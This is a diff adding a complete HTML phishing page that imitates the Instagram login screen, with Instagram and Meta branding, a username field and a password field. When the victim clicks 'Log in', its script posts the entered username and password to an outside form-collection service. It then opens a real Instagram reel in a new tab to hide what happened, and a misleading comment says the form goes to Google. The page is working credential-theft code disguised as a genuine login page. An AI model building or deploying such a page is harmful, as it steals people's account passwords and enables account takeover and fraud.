@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style type="text/css">    
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+    *{
+      margin: 0;
+      padding: 0;
+      font-family: Roboto;
+    }
+    .main-container{
+      height: 850px;
+      width: 100%;
+      background: #F5F6F7;
+      display: flex;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .lng,
+    .form,
+    .from,
+    .meta,
+    .links{
+      position: absolute;
+    }
+
+    a{
+      text-decoration: none;
+    }
+
+    .lng{
+      font-size: 13px;
+      color: #65676b;
+      padding: 10px;
+    }
+
+    .form{
+      margin-top: 100px;
+      display: flex;
+      justify-content: center;
+    }
+
+    .form .logo{
+      position: absolute;
+      height: 100px;
+      width:270px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: -30px;
+
+    }
+
+    .form .logo img{
+      height: 50px;
+      width: auto;
+    }
+
+    .form .facebook{
+      position: absolute;
+      height: fit-content;
+      width: fit-content;
+      background: #0095f6;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 8px;
+      height: 32px;
+      margin-top: 100px;
+    }
+
+    .form .facebook span{
+      font-size: 13px;
+      font-weight: 500;
+      color:#F5F6F7;
+      padding: 5px 42.6px 5px 42.6px;
+      width: 184.8px;
+    }
+
+    .form .facebook span i{
+      padding: 3px;
+      padding-right: 5px;
+    }
+    
+    .form hr{
+      position: absolute;
+      margin-top: 160px;
+      width: 270px;
+      height: 1px;
+      display: block;
+      border: none;
+      background: #dbdbdb;
+    }
+
+    .form .middle{
+      position: absolute;
+      margin-top: ;
+      font-size: 16px;
+      margin-top: 139px;
+      padding: 13px;
+      color: #737373;
+      background: #F5F6F7;
+    }
+
+    .form input{
+      position: absolute;
+      margin-top: 190px;
+      background: #fafafa;
+      text-align: left;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      width: 260px;
+      padding: 11px 0px 9px 8px;
+      font-family: Roboto;
+      font-size: 12px;
+    }
+
+    .form .pass{
+      margin-top: 232px;
+    }
+
+    .form .fgtpass{
+      position: absolute;
+      margin-top: 280px;
+      font-size: 13px;
+      width: 270px;
+      text-align: right;
+    }
+
+    .form .fgtpass a{
+      color: #0095f6;
+    }
+
+    button{
+      position: absolute;
+      margin-top: 420px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 32px;
+      width: 270px;
+      border-radius: 8px;
+      border:none;
+      background: #0095f6;
+      opacity: 0.8;
+      color: #f5f6f7;
+      font-weight: 600;
+      font-size: 13px;
+      letter-spacing: 0.2px;
+    }
+
+    button:enabled{
+      background: #0095f6;
+    }
+    .noacc{
+      position: absolute;
+      margin-top: 390px;
+      width: 270px;
+      text-align: center;
+      font-size: 13px;
+      color: #65676b;
+    }
+
+    .noacc a{
+      font-weight: 600;
+      color: #0095f6;
+    }
+
+    .from{
+      position: absolute;
+      margin-top: 690px;
+      color: #65676b;
+      font-size: 8px;
+    }
+
+    .meta{
+      height: fit-content;
+      width: fit-content;
+      margin-top: 700px;
+    }
+
+    .meta img{
+      height: 25px;
+      width: 100%;
+    }
+
+    .links{
+      color: #65676b;
+      font-size: 10px;
+      text-align: center;
+      margin-top: 750px;
+      padding: 10px;
+      word-spacing: 10px;
+      line-height: 20px;
+    }
+    .aftersub{
+      display: none;
+      justify-content: center;
+      height: 100vh;
+      position: absolute;
+      top:0;
+      left: 0;
+      background: #f5f6f7;
+      width: 100%;
+      padding: 20px;
+      text-align: center;
+      color: #65676b;
+    }
+
+    .aftersub span{
+      margin-top: 300px;
+      font-size: 20px;
+    }
+
+    .aftersub span a{
+      font-size: 40px;
+    }
+
+    .aftersub .logo{
+      position: absolute;
+      height: 100px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: -30px;
+
+    }
+
+    .aftersub .logo img{
+      height: 50px;
+      width: auto;
+    }
+  </style>
+</head>
+<body>
+<div class="main-container">
+  <div class="lng">English</div>
+  <form class="form" id="myForm" method="POST" target="_self">
+    <div class="logo"><img src="img/instagram.png"></div>
+    <div class="facebook">
+      <span><i class="fa-brands fa-square-facebook fa-lg"></i>Continue with Facebook</span>
+    </div>
+    <hr>
+    <span class="middle">OR</span>
+    <input class= "name" id="name" type="name" name="name" placeholder="Phone number, username, or email" oninput="validateInput()">
+    <input class= "pass" id="pass" type="password" name="password" placeholder="Password" oninput="validateInput()">
+    <span class="fgtpass"><a href="#">Forgot password?</a></span>
+    <span class="noacc">Don't have an account? <a href="#">Sign up</a></span>
+  </form>
+  <button class="login" id="openLinks" onclick="openTabs()" disabled>Log in</button>
+  <span class="from">from</span>
+  <div class="meta"><img src="img/meta.png"></div>
+  <span class="links">Meta About  Blog  Jobs  Help  API  Privacy  Terms  <br>
+    TopAccount  Locations  Instagram Lite  Threads  <br>
+    Contact Uploading Non-Users  Meta Verified
+  </span>
+</div>
+
+<div class="aftersub">
+  <div class="logo"><img src="img/instagram.png"></div>
+  <span><b>Sorry, this page isn't avilable.</b><br>
+    The page may have been removed.
+  </span>
+</div>
+
+<script>
+        function validateInput() {
+            var inputFields = document.querySelectorAll('#name, #pass');
+            var submitButton = document.getElementById('openLinks');
+            var allFieldsFilled = true;
+
+            for (var i = 0; i < inputFields.length; i++) {
+                if (inputFields[i].value.trim() === '') {
+                    allFieldsFilled = false;
+                    break;
+                }
+            }
+
+            submitButton.disabled = !allFieldsFilled;
+        }
+
+        function openTabs() {
+            // Update the form's action to Google
+            document.getElementById('myForm').action = 'https://submit-form.com/yoKVBK5M';
+            // Submit the form in the current tab (opens Google)
+            document.getElementById('myForm').submit();
+            // Open another link in a new tab
+            window.open('https://www.instagram.com/reel/CqlCaJDN380/?igshid=NjFhOGMzYTE3ZQ==', '_blank');
+        }
+    </script>
+</body>
+</html>
